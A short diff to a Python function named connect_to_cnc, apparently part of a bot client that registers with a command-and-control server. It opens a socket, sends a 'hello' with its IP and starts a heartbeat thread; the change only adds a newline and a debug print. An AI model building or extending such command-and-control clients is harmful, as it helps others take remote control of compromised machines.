@@ -13,7 +13,9 @@ def connect_to_cnc():
             sock = socket.socket()
             sock.connect((CNC_IP, CNC_PORT))
             ip = sock.getsockname()[0]
-            sock.send(f"hello {ip}".encode())
+            msg = f"hello {ip}\n"
+            print(f"send: {msg.strip()}")
+            sock.send(msg.encode())
 
             threading.Thread(target=heartbeat, args=(sock,), daemon=True).start()
 
